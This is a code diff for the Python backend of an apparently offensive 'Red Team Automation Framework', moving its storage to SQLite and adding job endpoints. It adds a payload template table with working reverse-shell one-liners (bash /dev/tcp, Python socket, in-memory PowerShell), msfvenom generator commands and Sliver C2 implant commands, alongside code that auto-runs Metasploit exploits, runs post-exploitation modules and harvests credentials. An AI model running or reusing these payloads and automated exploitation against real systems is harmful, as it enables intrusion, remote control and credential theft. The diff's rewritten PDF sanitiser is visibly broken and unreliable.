+                    log_adaptive("EXPLOIT", f"Auto-running exploit: {nba['module']}")
                     log_timeline("auto_exploit", f"Tactical engine triggered: {nba['module']}")
-                    
                     exploit_result = await run_metasploit(nba["module"], target, None, {}, vault_ctx.get("lhost"), 4444)
                     scan_progress[scan_id]["results"][f"msf_{nba['module'].split('/')[-1]}"] = exploit_result
-                    
                     if exploit_result.get("session_opened"):
-                        os_detected = vault_ctx.get("os_info", {}).get("os", "unknown") if vault_ctx else "unknown"
+                        os_detected = (vault_ctx or {}).get("os_info", {}).get("os", "unknown")
                         session_manager.register(scan_id, {"id": f"msf_{tool_count}", "host": target, "type": "meterpreter", "source": nba["module"], "platform": os_detected})
                         log_timeline("session", f"Session from auto-exploit: {nba['module']}")
-                    
                     output_text = exploit_result.get("output", "") if isinstance(exploit_result, dict) else ""
                     if isinstance(output_text, str) and output_text:
                         for cred in CredentialVault.parse_credentials_from_output(output_text, nba["module"], target):
                             credential_vault.add_credential(scan_id, cred)
-                
                 elif nba["action"] == "run_tool" and nba.get("tool"):
                     tool_name = nba["tool"]
                     if tool_name not in executed_tools and tool_name not in tool_queue:
                         tool_queue.insert(0, tool_name)
                         log_adaptive("PRIORITIZE", f"Prioritized {tool_name}: {nba.get('reason','')}")
-                
                 elif nba["action"] == "post_exploit" and session_manager.has_active(scan_id):
                     post_actions = session_manager.get_post_exploit_actions(scan_id)
                     for pa in post_actions[:3]:
@@ -1325,76 +917,66 @@ async def run_scan_background(scan_id: str, target: str, phases: List[str], tool
                             log_adaptive("POST_EXPLOIT", f"Running: {pa['module']}")
                             pe_result = await run_metasploit(pa["module"], target, None, {}, None, 4444)
                             scan_progress[scan_id]["results"][f"post_{pa['action']}"] = pe_result
-                            output_text = pe_result.get("output", "") if isinstance(pe_result, dict) else ""
-                            if isinstance(output_text, str) and output_text:
-                                for cred in CredentialVault.parse_credentials_from_output(output_text, pa["module"], target):
-                                    credential_vault.add_credential(scan_id, cred)
-            
-            # 4. Handle chain trigger
+
             chain_trigger = tactical.get("trigger_chain")
             if chain_trigger and chain_trigger.get("confidence", 0) >= 0.5:
                 log_adaptive("CHAIN_TRIGGER", f"Auto-triggering chain: {chain_trigger['chain_id']} (confidence: {chain_trigger['confidence']:.0%})")
-                log_timeline("chain_trigger", f"Attack chain triggered: {chain_trigger['chain_id']}", chain_trigger)
-                # Don't execute chain in scan loop, just record the suggestion strongly
                 scan_progress[scan_id]["auto_triggered_chain"] = chain_trigger
-            
-            # Pause between tools
+
             await asyncio.sleep(SCAN_LIMITS["pause_between_tools"])
-        
-        # ===== POST-LOOP: Final analysis =====
+
+        # Post-loop: Final analysis
         scan_progress[scan_id]["current_tool"] = "tactical_engine"
         scan_progress[scan_id]["progress"] = 85
-        
+        await repo.job_update(job_id, progress=85, current_step="tactical_engine")
+
         final_tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target, credential_vault.get_context(scan_id))
         scan_progress[scan_id]["final_tactical"] = final_tactical
-        
-        # AI Analysis
+
         scan_progress[scan_id]["current_tool"] = "kimi_ai"
         scan_progress[scan_id]["progress"] = 90
-        
+        await repo.job_update(job_id, progress=90, current_step="kimi_ai")
+        await repo.job_log(job_id, "info", "Running AI analysis...", module="scan")
+
         ai_result = await get_tactical_ai_advice(scan_progress[scan_id]["results"], target, final_tactical)
         scan_progress[scan_id]["ai_analysis"] = ai_result["analysis"]
         scan_progress[scan_id]["exploits"] = ai_result.get("exploits", [])
-        
-        # Build attack tree
+
         attack_tree = build_attack_tree(scan_id, target, scan_progress[scan_id]["results"], phases, ai_result, final_tactical)
         scan_progress[scan_id]["attack_tree"] = attack_tree
         attack_trees[scan_id] = attack_tree
-        
+
         scan_progress[scan_id]["status"] = "completed"
         scan_progress[scan_id]["progress"] = 100
-        
-        # Auto-detect applicable chains
+
         suggested_chains = AttackChainEngine.get_applicable_chains(scan_progress[scan_id]["results"])
         scan_progress[scan_id]["suggested_chains"] = suggested_chains
-        
-        # Recommended MSF modules
+
         recommended_modules = get_recommended_modules(scan_progress[scan_id]["results"], final_tactical)
         scan_progress[scan_id]["recommended_modules"] = recommended_modules
-        
-        # Vault summary
+
         scan_progress[scan_id]["vault_summary"] = credential_vault.get_vault_summary(scan_id)
-        
-        # Save vault to DB
         await credential_vault.save_to_db(scan_id)
-        
-        log_timeline("complete", f"Scan complete. Tools: {tool_count}, Creds: {len(credential_vault.get_credentials(scan_id))}, Sessions: {len(session_manager.get_sessions(scan_id))}")
-        
-        await db.scans.insert_one({
-            "id": scan_id, "target": target, "status": "completed",
-            "phases": phases, "results": scan_progress[scan_id]["results"],
-            "tactical_decisions": scan_progress[scan_id]["tactical_decisions"],
-            "final_tactical": final_tactical,
-            "ai_analysis": scan_progress[scan_id]["ai_analysis"],
-            "attack_tree": attack_tree,
-            "suggested_chains": suggested_chains,
-            "recommended_modules": recommended_modules,
-            "vault_summary": scan_progress[scan_id]["vault_summary"],
-            "timeline": scan_progress[scan_id]["timeline"],
-            "adaptive_log": scan_progress[scan_id]["adaptive_log"],
-            "created_at": datetime.now(timezone.utc).isoformat()
-        })
-        
+
+        log_timeline("complete", f"Scan complete. Tools: {tool_count}, Creds: {len(credential_vault.get_credentials(scan_id))}")
+
+        # Persist scan to SQLite
+        await repo.scan_update(scan_id,
+            status="completed",
+            results=scan_progress[scan_id]["results"],
+            ai_analysis=json.dumps({"analysis": scan_progress[scan_id]["ai_analysis"], "exploits": scan_progress[scan_id].get("exploits", [])}),
+            attack_tree=attack_tree,
+            suggested_chains=suggested_chains,
+            recommended_modules=recommended_modules,
+            vault=scan_progress[scan_id]["vault_summary"],
+            timeline=scan_progress[scan_id]["timeline"],
+            progress=100,
+            finished_at=datetime.now(timezone.utc).isoformat()
+        )
+        await repo.job_log(job_id, "info", "Scan completed successfully", module="scan")
+
+        return {"scan_id": scan_id, "status": "completed", "tool_count": tool_count}
+
     except Exception as e:
         import traceback
         logger.error(f"Scan error: {str(e)}")
@@ -1402,157 +984,229 @@ async def run_scan_background(scan_id: str, target: str, phases: List[str], tool
         scan_progress[scan_id]["status"] = "error"
         scan_progress[scan_id]["error"] = str(e)
         log_timeline("error", str(e))
+        await repo.scan_update(scan_id, status="error")
+        raise
 
 
 def get_recommended_modules(results: Dict, tactical: Dict) -> List[Dict]:
-    """Get MSF modules recommended based on scan findings"""
     recommended = []
     results_text = json.dumps(results).lower()
     tactical_text = json.dumps(tactical).lower()
     combined = results_text + " " + tactical_text
-    
     for mod in METASPLOIT_MODULES:
         score = 0
         reasons = []
         mod_name_lower = mod["name"].lower()
         mod_desc_lower = mod["desc"].lower()
-        
-        # Check service matches
         if "smb" in combined and "smb" in mod_name_lower:
-            score += 3
-            reasons.append("SMB service detected")
+            score += 3; reasons.append("SMB service detected")
         if "ssh" in combined and "ssh" in mod_name_lower:
-            score += 3
-            reasons.append("SSH service detected")
+            score += 3; reasons.append("SSH service detected")
         if ("http" in combined or "80/tcp" in combined) and "http" in mod_name_lower:
-            score += 2
-            reasons.append("HTTP service detected")
+            score += 2; reasons.append("HTTP service detected")
         if "rdp" in combined and "rdp" in mod_name_lower:
-            score += 3
-            reasons.append("RDP service detected")
-        
-        # Check vulnerability matches
+            score += 3; reasons.append("RDP service detected")
         if "shellshock" in combined and "shellshock" in mod_desc_lower:
-            score += 5
-            reasons.append("Shellshock vulnerability found")
+            score += 5; reasons.append("Shellshock vulnerability found")
         if "eternalblue" in combined and "eternalblue" in mod_desc_lower:
-            score += 5
-            reasons.append("EternalBlue vulnerability found")
+            score += 5; reasons.append("EternalBlue vulnerability found")
         if "log4" in combined and "log4" in mod_desc_lower:
-            score += 5
-            reasons.append("Log4Shell vulnerability found")
-        
-        # Excellent rank bonus
+            score += 5; reasons.append("Log4Shell vulnerability found")
         if mod["rank"] == "excellent":
             score += 1
-        
         if score > 0:
             recommended.append({**mod, "relevance_score": score, "reasons": reasons})
-    
     recommended.sort(key=lambda x: x["relevance_score"], reverse=True)
     return recommended
+
+
+# =============================================================================
+# PAYLOAD TEMPLATES
+# =============================================================================
+PAYLOAD_TEMPLATES = {
+    "windows/meterpreter/reverse_tcp": {"name": "Windows Meterpreter Reverse TCP", "platform": "windows", "arch": "x64", "type": "staged", "generator": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"", "output_ext": "exe", "description": "Staged Meterpreter. Requires handler listening."},
+    "windows/meterpreter/reverse_https": {"name": "Windows Meterpreter Reverse HTTPS", "platform": "windows", "arch": "x64", "type": "staged", "generator": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"", "output_ext": "exe", "description": "Encrypted HTTPS channel."},
+    "windows/shell_reverse_tcp": {"name": "Windows Shell Reverse TCP", "platform": "windows", "arch": "x64", "type": "stageless", "generator": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "exe", "description": "Simple CMD shell."},
+    "linux/shell_reverse_tcp": {"name": "Linux Shell Reverse TCP", "platform": "linux", "arch": "x64", "type": "stageless", "generator": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "elf", "description": "ELF binary reverse shell."},
+    "linux/meterpreter/reverse_tcp": {"name": "Linux Meterpreter Reverse TCP", "platform": "linux", "arch": "x64", "type": "staged", "generator": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}", "handler": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit -j\"", "output_ext": "elf", "description": "Linux Meterpreter."},
+    "php/reverse_php": {"name": "PHP Reverse Shell", "platform": "php", "arch": "any", "type": "stageless", "generator": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o {output}", "handler": "nc -lvnp {lport}", "output_ext": "php", "description": "PHP web shell for upload vulns."},
+    "bash_reverse": {"name": "Bash One-Liner Reverse Shell", "platform": "linux", "arch": "any", "type": "oneliner", "generator": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "No binary needed."},
+    "python_reverse": {"name": "Python Reverse Shell", "platform": "any", "arch": "any", "type": "oneliner", "generator": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "Cross-platform."},
+    "powershell_reverse": {"name": "PowerShell Reverse Shell", "platform": "windows", "arch": "any", "type": "oneliner", "generator": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}\"", "handler": "nc -lvnp {lport}", "output_ext": None, "description": "No binary drop. Runs in memory."},
+    "sliver_session": {"name": "Sliver Session Implant", "platform": "linux", "arch": "amd64", "type": "implant", "generator": "sliver > generate --mtls {lhost}:{lport} --os {platform} --arch {arch} --save {output}", "handler": "sliver > mtls --lhost {lhost} --lport {lport}", "output_ext": "elf", "description": "Sliver C2 implant."},
+    "sliver_beacon": {"name": "Sliver Beacon Implant", "platform": "linux", "arch": "amd64", "type": "implant", "generator": "sliver > generate beacon --mtls {lhost}:{lport} --os {platform} --arch {arch} --seconds 60 --jitter 30 --save {output}", "handler": "sliver > mtls --lhost {lhost} --lport {lport}", "output_ext": "elf", "description": "Sliver C2 beacon."},
+}
+
+
+def sanitize_for_pdf(text: str) -> str:
+    if not text:
+        return ""
+    replacements = {'->': '->', '<-': '<-', '<->': '<->', '*': '*', '-': '-', '-': '-', '"': '"', '"': '"', "'": "'", "'": "'", '...': '...', '[OK]': '[OK]', '[X]': '[X]', '*': '*', '*': '*', '#': '#', '#': '#', '.': '.', '=': '=', '|': '|', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+', '+': '+'}
+    try:
+        return text.encode('latin-1', errors='replace').decode('latin-1')
+    except Exception:
+        return text.encode('ascii', errors='replace').decode('ascii')
+
 
 # =============================================================================
 # API ROUTES
 # =============================================================================
+
 @api_router.get("/")
 async def root():
-    return {"message": "Red Team Automation Framework", "version": "5.0.0", "features": ["tactical_engine", "adaptive_planning", "waf_bypass", "global_config", "docker"]}
+    return {"message": "Red Team Automation Framework", "version": "6.0.0-local", "architecture": "local-first", "database": "sqlite"}
+
+
+# ============ HEALTH (fast) ============
 
 @api_router.get("/health")
 async def health():
-    """Health check with connectivity diagnostics"""
-    checks = {}
-    # MongoDB
-    try:
-        await db.command("ping")
-        checks["mongodb"] = {"status": "connected", "url": mongo_url.split("@")[-1] if "@" in mongo_url else mongo_url}
-    except Exception as e:
-        checks["mongodb"] = {"status": "error", "error": str(e)}
+    db_ok = await repo.is_healthy()
+    checks = {
+        "database": {"engine": "sqlite", "path": config.db_path, "status": "connected" if db_ok else "error"},
+        "msf_rpc": {"host": MSF_RPC_HOST, "port": MSF_RPC_PORT, "token_set": bool(MSF_RPC_TOKEN), "connected": msf_module.is_connected()},
+        "sliver": {"config_path": SLIVER_CONFIG_PATH, "connected": sliver_module.is_connected()},
+        "listener": {"ip": global_config.get("listener_ip", ""), "port": global_config.get("listener_port", 4444), "configured": bool(global_config.get("listener_ip"))},
+        "active_jobs": await jobs.list_active(),
+    }
+    return {"status": "healthy" if db_ok else "degraded", "checks": checks}
+
+
+# ============ DOCTOR (deep diagnostic) ============
+
+@api_router.get("/doctor")
+async def doctor():
+    diag = {"database": {}, "integrations": {}, "config": {}, "hints": []}
+
+    # DB check
+    db_ok = await repo.is_healthy()
+    diag["database"] = {"engine": "sqlite", "path": config.db_path, "healthy": db_ok}
+    if not db_ok:
+        diag["hints"].append("Database connection failed. Check DB_PATH in .env")
+
+    # Config validation
+    diag["config"] = {"mode": config.app_mode, "warnings": config.warnings, "errors": config.errors}
+    for w in config.warnings:
+        diag["hints"].append(f"Config warning: {w}")
 
     # MSF RPC
-    checks["msf_rpc"] = {
-        "host": MSF_RPC_HOST,
-        "port": MSF_RPC_PORT,
-        "token_set": bool(MSF_RPC_TOKEN),
-        "connected": msf_module.is_connected()
-    }
+    msf_ok = msf_module.is_connected()
+    diag["integrations"]["metasploit"] = {"connected": msf_ok, "host": MSF_RPC_HOST, "port": MSF_RPC_PORT}
+    if not msf_ok and MSF_RPC_TOKEN:
+        diag["hints"].append(f"MSF RPC not connected. Ensure msfrpcd is running: msfrpcd -P {MSF_RPC_TOKEN} -S -a {MSF_RPC_HOST} -p {MSF_RPC_PORT}")
+    elif not MSF_RPC_TOKEN:
+        diag["hints"].append("MSF_RPC_TOKEN not set. Metasploit integration disabled (optional).")
 
     # Sliver
-    checks["sliver"] = {
-        "config_path": SLIVER_CONFIG_PATH,
-        "connected": sliver_module.is_connected()
-    }
+    sliver_ok = sliver_module.is_connected()
+    diag["integrations"]["sliver"] = {"connected": sliver_ok, "config_path": SLIVER_CONFIG_PATH}
+    if not sliver_ok and SLIVER_CONFIG_PATH:
+        diag["hints"].append(f"Sliver not connected. Check config: {SLIVER_CONFIG_PATH}")
+    elif not SLIVER_CONFIG_PATH:
+        diag["hints"].append("SLIVER_CONFIG_PATH not set. Sliver integration disabled (optional).")
 
-    # Global config
-    checks["listener"] = {
-        "ip": global_config.get("listener_ip", ""),
-        "port": global_config.get("listener_port", 4444),
-        "configured": bool(global_config.get("listener_ip"))
-    }
+    # AI
+    diag["integrations"]["kimi_ai"] = {"configured": bool(KIMI_API_KEY)}
+    if not KIMI_API_KEY:
+        diag["hints"].append("KIMI_API_KEY not set. AI analysis disabled (optional).")
 
-    all_ok = checks["mongodb"]["status"] == "connected"
-    return {"status": "healthy" if all_ok else "degraded", "checks": checks}
+    # Tools
+    tool_checks = {}
+    for tool_name in ["nmap", "nikto", "sqlmap", "hydra", "msfvenom"]:
+        try:
+            subprocess.run(["which", tool_name], capture_output=True, timeout=5)
+            tool_checks[tool_name] = True
+        except Exception:
+            tool_checks[tool_name] = False
+    diag["tools"] = tool_checks
+    missing = [t for t, ok in tool_checks.items() if not ok]
+    if missing:
+        diag["hints"].append(f"Missing tools: {', '.join(missing)}. Install with: sudo apt install {' '.join(missing)}")
+
+    return diag
+
+
+# ============ JOB ENDPOINTS (NEW) ============
+
+@api_router.post("/jobs/{job_type}/start")
+async def start_job(job_type: str, data: Dict[str, Any] = {}):
+    """Start an async job. Returns job_id immediately."""
+    target = data.get("target", "")
+
+    if job_type == "scan":
+        scan_id = str(uuid.uuid4())
+        params = {
+            "scan_id": scan_id,
+            "phases": data.get("scan_phases", data.get("phases", ["reconnaissance", "initial_access"])),
+            "tools": data.get("tools", []),
+        }
+        target = target.strip().replace("https://", "").replace("http://", "").split("/")[0]
+        result = await jobs.submit("scan", scan_job_handler, target=target, params=params)
+        result["scan_id"] = scan_id
+        return result
+    else:
+        raise HTTPException(status_code=400, detail=f"Unknown job type: {job_type}")
+
+
+@api_router.get("/jobs")
+async def list_jobs(status: str = None, job_type: str = None):
+    """List jobs with optional filters."""
+    job_list = await repo.job_list(status=status, job_type=job_type)
+    active = await jobs.list_active()
+    return {"jobs": job_list, "active_job_ids": active}
+
+
+@api_router.get("/jobs/{job_id}")
+async def get_job(job_id: str):
+    """Get job status with recent logs."""
+    result = await jobs.get_status(job_id)
+    if not result:
+        raise HTTPException(status_code=404, detail="Job not found")
+    return result
+
+
+@api_router.post("/jobs/{job_id}/cancel")
+async def cancel_job(job_id: str):
+    """Cancel a running job."""
+    cancelled = await jobs.cancel(job_id)
+    if cancelled:
+        return {"status": "cancelled", "job_id": job_id}
+    raise HTTPException(status_code=400, detail="Job not running or not found")
+
+
+@api_router.get("/jobs/{job_id}/logs")
+async def get_job_logs(job_id: str, limit: int = 200):
+    """Get logs for a specific job."""
+    logs = await repo.job_logs_get(job_id, limit=limit)
+    return {"job_id": job_id, "logs": logs}
+
 
 # ============ GLOBAL CONFIG ENDPOINTS ============
 
 @api_router.get("/config")
 async def get_config():
-    """Get global operator configuration"""
     return {**global_config}
 
 @api_router.put("/config")
 async def update_config(data: Dict[str, Any]):
-    """Update global operator configuration"""
     global global_config
     allowed_keys = {"listener_ip", "listener_port", "c2_protocol", "operator_name", "stealth_mode", "auto_lhost"}
     updates = {k: v for k, v in data.items() if k in allowed_keys}
     global_config.update(updates)
-    await db.global_config.update_one(
-        {"_id": "operator_config"},
-        {"$set": global_config},
-        upsert=True
-    )
+    await repo.config_set("operator_config", global_config)
     return {"status": "updated", "config": {**global_config}}
 
-@app.on_event("startup")
-async def startup_event():
-    await load_global_config()
 
-@api_router.get("/mitre/tactics")
-async def get_mitre_tactics():
-    return {"tactics": MITRE_TACTICS}
-
-@api_router.get("/tools")
-async def get_tools(phase: str = None):
-    tools = {k: v for k, v in RED_TEAM_TOOLS.items() if not phase or v["phase"] == phase}
-    return {"tools": tools}
-
-@api_router.get("/tactical/waf-bypass/{waf_name}")
-async def get_waf_bypass_strategy(waf_name: str):
-    """Get specific WAF bypass strategies"""
-    waf_lower = waf_name.lower()
-    for key, strategy in TacticalDecisionEngine.WAF_BYPASS_STRATEGIES.items():
-        if key in waf_lower:
-            return strategy
-    return TacticalDecisionEngine.WAF_BYPASS_STRATEGIES["default"]
-
-@api_router.get("/tactical/service-attacks")
-async def get_service_attacks():
-    """Get service-specific attack strategies"""
-    return {"strategies": TacticalDecisionEngine.SERVICE_ATTACK_MAP}
-
-@api_router.get("/tactical/vuln-exploits")
-async def get_vuln_exploits():
-    """Get vulnerability to exploit mapping"""
-    return {"mappings": TacticalDecisionEngine.VULN_EXPLOIT_MAP}
+# ============ SCAN ENDPOINTS (backwards compatible + job-based) ============
 
 @api_router.post("/scan/start")
 async def start_scan(scan: ScanCreate, background_tasks: BackgroundTasks):
+    """Start a scan via the Job system. Returns scan_id AND job_id."""
     scan_id = str(uuid.uuid4())
     target = scan.target.strip().replace("https://", "").replace("http://", "").split("/")[0]
-    background_tasks.add_task(run_scan_background, scan_id, target, scan.scan_phases, scan.tools)
-    return {"scan_id": scan_id, "target": target, "phases": scan.scan_phases, "status": "started"}
+    params = {"scan_id": scan_id, "phases": scan.scan_phases, "tools": scan.tools}
+    result = await jobs.submit("scan", scan_job_handler, target=target, params=params)
+    return {"scan_id": scan_id, "job_id": result["job_id"], "target": target, "phases": scan.scan_phases, "status": "started"}
 
 @api_router.get("/scan/{scan_id}/status")
 async def get_scan_status(scan_id: str):
@@ -1572,22 +1226,28 @@ async def get_scan_status(scan_id: str):
             "adaptive_log": p.get("adaptive_log", []),
             "auto_triggered_chain": p.get("auto_triggered_chain")
         }
-    
-    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
+    scan = await repo.scan_get(scan_id)
     if scan:
+        ai_analysis_data = scan.get("ai_analysis") or {}
+        if isinstance(ai_analysis_data, str):
+            try:
+                ai_analysis_data = json.loads(ai_analysis_data)
+            except Exception:
+                ai_analysis_data = {"analysis": ai_analysis_data, "exploits": []}
         return {
             "scan_id": scan_id, "status": scan["status"], "current_tool": None,
             "progress": 100, "results": scan.get("results", {}),
-            "tactical_decisions": scan.get("tactical_decisions", []),
-            "final_tactical": scan.get("final_tactical"),
-            "ai_analysis": scan.get("ai_analysis"), "exploits": scan.get("exploits", []),
+            "tactical_decisions": [],
+            "final_tactical": None,
+            "ai_analysis": ai_analysis_data.get("analysis") if isinstance(ai_analysis_data, dict) else ai_analysis_data,
+            "exploits": ai_analysis_data.get("exploits", []) if isinstance(ai_analysis_data, dict) else [],
             "attack_tree": scan.get("attack_tree"),
             "suggested_chains": scan.get("suggested_chains", []),
             "recommended_modules": scan.get("recommended_modules", []),
-            "vault_summary": scan.get("vault_summary", {}),
+            "vault_summary": scan.get("vault", {}),
             "timeline": scan.get("timeline", []),
-            "adaptive_log": scan.get("adaptive_log", []),
-            "auto_triggered_chain": scan.get("auto_triggered_chain")
+            "adaptive_log": [],
+            "auto_triggered_chain": None
         }
     raise HTTPException(status_code=404, detail="Scan not found")
 
@@ -1595,28 +1255,27 @@ async def get_scan_status(scan_id: str):
 async def get_attack_tree(scan_id: str):
     if scan_id in attack_trees:
         return attack_trees[scan_id]
-    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
-    if scan and "attack_tree" in scan:
+    scan = await repo.scan_get(scan_id)
+    if scan and scan.get("attack_tree"):
         return scan["attack_tree"]
     raise HTTPException(status_code=404, detail="Tree not found")
 
 @api_router.put("/scan/{scan_id}/tree/node/{node_id}")
 async def update_tree_node(scan_id: str, node_id: str, update: UpdateNodeStatus):
     if scan_id not in attack_trees:
-        scan = await db.scans.find_one({"id": scan_id}, {"_id": 0, "attack_tree": 1})
-        if scan:
+        scan = await repo.scan_get(scan_id)
+        if scan and scan.get("attack_tree"):
             attack_trees[scan_id] = scan["attack_tree"]
         else:
             raise HTTPException(status_code=404, detail="Tree not found")
-    
     tree = attack_trees[scan_id]
     if node_id in tree["nodes"]:
         tree["nodes"][node_id]["status"] = update.status
-        await db.scans.update_one({"id": scan_id}, {"$set": {"attack_tree": tree}})
+        await repo.scan_update(scan_id, attack_tree=tree)
     return {"message": "Updated", "status": update.status}
 
 @api_router.post("/metasploit/execute")
-async def execute_metasploit(exploit: ExploitExecute):
+async def execute_metasploit_endpoint(exploit: ExploitExecute):
     return await run_metasploit(exploit.module, exploit.target_host, exploit.target_port, exploit.options, exploit.lhost, exploit.lport)
 
 @api_router.get("/metasploit/modules")
@@ -1630,71 +1289,25 @@ async def get_metasploit_modules(query: str = "", category: str = ""):
 
 @api_router.get("/scan/history")
 async def get_scan_history():
-    return await db.scans.find({}, {"_id": 0, "id": 1, "target": 1, "status": 1, "phases": 1, "created_at": 1}).sort("created_at", -1).to_list(100)
+    scans = await repo.scan_list(limit=100)
+    return scans
 
 @api_router.get("/scan/{scan_id}/report")
 async def get_scan_report(scan_id: str):
-    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
+    scan = await repo.scan_get(scan_id)
     if not scan:
         raise HTTPException(status_code=404, detail="Not found")
     return {"report": scan}
 
-def sanitize_for_pdf(text: str) -> str:
-    """Sanitize text for PDF - replace Unicode chars not supported by Courier font"""
-    if not text:
-        return ""
-    # Replace common Unicode characters with ASCII equivalents
-    replacements = {
-        '→': '->',
-        '←': '<-',
-        '↔': '<->',
-        '•': '*',
-        '–': '-',
-        '—': '-',
-        '"': '"',
-        '"': '"',
-        ''': "'",
-        ''': "'",
-        '…': '...',
-        '✓': '[OK]',
-        '✗': '[X]',
-        '★': '*',
-        '☆': '*',
-        '█': '#',
-        '▓': '#',
-        '░': '.',
-        '═': '=',
-        '║': '|',
-        '╔': '+',
-        '╗': '+',
-        '╚': '+',
-        '╝': '+',
-        '╠': '+',
-        '╣': '+',
-        '╦': '+',
-        '╩': '+',
-        '╬': '+',
-    }
-    for unicode_char, ascii_char in replacements.items():
-        text = text.replace(unicode_char, ascii_char)
-    # Remove any remaining non-latin1 characters
-    try:
-        return text.encode('latin-1', errors='replace').decode('latin-1')
-    except Exception:
-        return text.encode('ascii', errors='replace').decode('ascii')
-
 @api_router.get("/scan/{scan_id}/report/pdf")
 async def get_scan_report_pdf(scan_id: str):
-    """Generate informal PDF report - estilo reporte entre colegas"""
-    scan = await db.scans.find_one({"id": scan_id}, {"_id": 0})
+    scan = await repo.scan_get(scan_id)
     if not scan:
         raise HTTPException(status_code=404, detail="Not found")
-    
+
     pdf = FPDF()
     pdf.set_auto_page_break(auto=True, margin=15)
     pdf.add_page()
-    
-    # Header
     pdf.set_font("Courier", "B", 18)
     pdf.cell(0, 12, "RED TEAM - REPORTE DE OPERACION", ln=True, align="C")
     pdf.set_font("Courier", "", 10)
@@ -1702,487 +1315,52 @@ async def get_scan_report_pdf(scan_id: str):
     pdf.cell(0, 8, f"Target: {scan.get('target', 'N/A')}", ln=True, align="C")
     pdf.line(10, pdf.get_y(), 200, pdf.get_y())
     pdf.ln(5)
-    
-    # Resumen ejecutivo - informal
     pdf.set_font("Courier", "B", 14)
     pdf.cell(0, 10, "QUE ENCONTRAMOS", ln=True)
     pdf.set_font("Courier", "", 10)
-    
-    # Status
-    status = scan.get("status", "unknown")
-    pdf.cell(0, 7, f"Estado del escaneo: {status.upper()}", ln=True)
-    phases = scan.get("phases", [])
-    pdf.cell(0, 7, f"Fases ejecutadas: {', '.join(phases)}", ln=True)
-    pdf.ln(3)
-    
-    # Tool results summary
+    pdf.cell(0, 7, f"Estado: {scan.get('status', 'unknown').upper()}", ln=True)
     results = scan.get("results", {})
     if results:
         pdf.set_font("Courier", "B", 12)
         pdf.cell(0, 10, "RESULTADOS POR HERRAMIENTA", ln=True)
         pdf.set_font("Courier", "", 9)
-        
-        for tool_name, tool_result in results.items():
+        for tool_name, tool_result in (results.items() if isinstance(results, dict) else []):
             pdf.set_font("Courier", "B", 10)
             pdf.cell(0, 8, f">>> {tool_name.upper()}", ln=True)
             pdf.set_font("Courier", "", 9)
-            
-            if tool_name == "wafw00f" or "waf" in tool_name:
-                waf = tool_result.get("waf", "No detectado")
-                pdf.cell(0, 6, f"  WAF detectado: {waf or 'Ninguno'}", ln=True)
-            elif tool_name == "nmap":
-                ports = tool_result.get("ports", [])
-                if ports:
-                    for p in ports[:15]:
-                        pdf.cell(0, 6, f"  {p.get('port','?')} - {p.get('state','?')} - {p.get('service','?')}", ln=True)
-                else:
-                    pdf.cell(0, 6, "  Sin puertos abiertos o resultado simulado", ln=True)
-            elif tool_name == "nikto":
-                vulns = tool_result.get("vulnerabilities", [])
-                if vulns:
-                    for v in vulns[:10]:
-                        finding = v.get("finding", str(v))[:90]
-                        pdf.cell(0, 6, f"  [{v.get('severity','?')}] {finding}", ln=True)
-                else:
-                    pdf.cell(0, 6, "  Sin vulnerabilidades detectadas", ln=True)
-            else:
+            if isinstance(tool_result, dict):
                 if tool_result.get("simulated"):
-                    pdf.cell(0, 6, f"  [SIMULADO] Comando: {tool_result.get('command', 'N/A')[:80]}", ln=True)
-                elif tool_result.get("output"):
-                    output_lines = str(tool_result["output"])[:300].split('\n')
-                    for line in output_lines[:5]:
-                        pdf.cell(0, 6, f"  {line[:90]}", ln=True)
+                    pdf.cell(0, 6, f"  [SIMULADO] {str(tool_result.get('command',''))[:80]}", ln=True)
+                elif tool_result.get("ports"):
+                    for p in tool_result["ports"][:15]:
+                        pdf.cell(0, 6, f"  {p.get('port','?')} - {p.get('state','?')} - {p.get('service','?')}", ln=True)
+                elif tool_result.get("vulnerabilities"):
+                    for v in tool_result["vulnerabilities"][:10]:
+                        pdf.cell(0, 6, sanitize_for_pdf(f"  [{v.get('severity','?')}] {v.get('finding', '')[:80]}"), ln=True)
             pdf.ln(2)
-    
-    # Tactical Analysis
-    final_tactical = scan.get("final_tactical", {})
-    if final_tactical:
